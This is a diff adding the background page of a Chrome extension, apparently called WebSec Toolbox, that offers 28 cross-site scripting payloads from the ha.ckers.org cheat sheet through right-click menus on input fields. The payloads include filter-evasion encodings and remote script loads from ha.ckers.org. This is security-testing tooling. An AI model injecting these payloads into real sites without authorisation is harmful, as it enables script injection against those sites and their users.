@@ -1,0 +1,255 @@
+<!--WebSec Toolbox created December 2011 by Matthew Fuller: http://matthewdfuller.com
+Sample XSS Scripts from http://ha.ckers.org/xss.html.
+-->
+<html>
+  <head>
+    <script>
+        
+      // Set up the context menus
+      var parent_xss = chrome.contextMenus.create({
+        "title": "XSS (Cross-Site Scripting)",
+        "contexts": ["editable"],
+        "onclick" : function(e) {          
+        }
+      });
+      var parent_mysql = chrome.contextMenus.create({
+        "title": "mySQL Injection",
+        "contexts": ["editable"],
+        "onclick" : function(e) {
+          
+        }
+      });
+      var parent_other = chrome.contextMenus.create({
+        "title": "Other Code",
+        "contexts": ["editable"],
+        "onclick" : function(e) { 
+        }
+      });
+      var child_xss_1 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "01. \"<script>alert('test');</script\>",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "\"<script>alert('test');</script\>"});
+        }
+        });
+      var child_xss_2 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "02. <SCRIPT SRC=http://ha.ckers.org/xss.js\></SCRIPT\>",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "<SCRIPT SRC=http://ha.ckers.org/xss.js\></SCRIPT\>"});
+        }
+        });
+      var child_xss_3 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "03. '';!--\"<XSS\>=&{()}",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "'';!--\"<XSS\>=&{()}"});
+        }
+        });
+      var child_xss_4 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "04. <IMG SRC=\"javascript:alert('XSS');\">",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "<IMG SRC=\"javascript:alert('XSS');\">"});
+        }
+        });
+      var child_xss_5 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "05. <IMG SRC=javascript:alert('XSS')>",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "<IMG SRC=javascript:alert('XSS')>"});
+        }
+        });
+      var child_xss_6 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "06. <IMG SRC=JaVaScRiPt:alert('XSS')>",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "<IMG SRC=JaVaScRiPt:alert('XSS')>"});
+        }
+        });
+      var child_xss_7 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "07. <IMG SRC=javascript:alert(&&quot;XSS&&quot;)>",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "<IMG SRC=javascript:alert(&quot;XSS&quot;)>"});
+        }
+        });
+      var child_xss_8 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "08. <IMG SRC=`javascript:alert(\"XSS\")`>",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "<IMG SRC=`javascript:alert(\"XSS\")`>"});
+        }
+        });
+      var child_xss_9 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "09. <IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT\>\">",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT\>\">"});
+        }
+        });
+      var child_xss_10 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "10. <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"});
+        }
+        });
+      var child_xss_11 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "11. UTF-8 Unicode Encoding Inside IMG Tag",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>"});
+        }
+        });
+      var child_xss_12 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "12. Long UTF-8 Unicode Encoding Without Semicolons",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>"});
+        }
+        });
+      var child_xss_13 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "13. Hex Encoding Without Semicolons",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>"});
+        }
+        });
+      var child_xss_14 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "14. <IMG SRC=\"jav	ascript:alert('XSS');\">",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "<IMG SRC=\"jav	ascript:alert('XSS');\">"});
+        }
+        });
+      var child_xss_15 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "15. <IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">"});
+        }
+        });
+      var child_xss_16 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "16. <IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">"});
+        }
+        });
+      var child_xss_17 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "17. <IMG SRC=\" &#14;  javascript:alert('XSS');\">",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "<IMG SRC=\" &#14;  javascript:alert('XSS');\">"});
+        }
+        });
+      var child_xss_18 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "18. <SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT\>",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT\>"});
+        }
+        });
+      var child_xss_19 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "19. <BODY onload!#$%&&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>"});
+        }
+        });
+      var child_xss_20 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "20. <SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT\>",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT\>"});
+        }
+        });
+      var child_xss_21 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "21. \\\";alert('XSS');//",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "\\\";alert('XSS');//"});
+        }
+        });
+      var child_xss_22 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "22. </TITLE><SCRIPT>alert(\"XSS\");</SCRIPT\>",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT\>"});
+        }
+        });
+      var child_xss_23 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "23. <INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">"});
+        }
+        });
+      var child_xss_24 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "24. <BODY BACKGROUND=\"javascript:alert('XSS')\">",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "<BODY BACKGROUND=\"javascript:alert('XSS')\">"});
+        }
+        });
+      var child_xss_25 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "25. <BODY ONLOAD=alert('XSS')>",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "<BODY ONLOAD=alert('XSS')>"});
+        }
+        });
+      var child_xss_26 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "26. <LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">"});
+        }
+        });
+      var child_xss_27 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "27. <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>"});
+        }
+        });
+      var child_xss_28 = chrome.contextMenus.create({
+        "parentId": parent_xss,
+        "title": "28. <IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
+        "contexts": ["editable"],
+        "onclick" : function(info, tab){
+            chrome.tabs.sendRequest(tab.id, {text: "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>"});
+        }
+        });
+    </script>
+    
+  </head>
+</html>
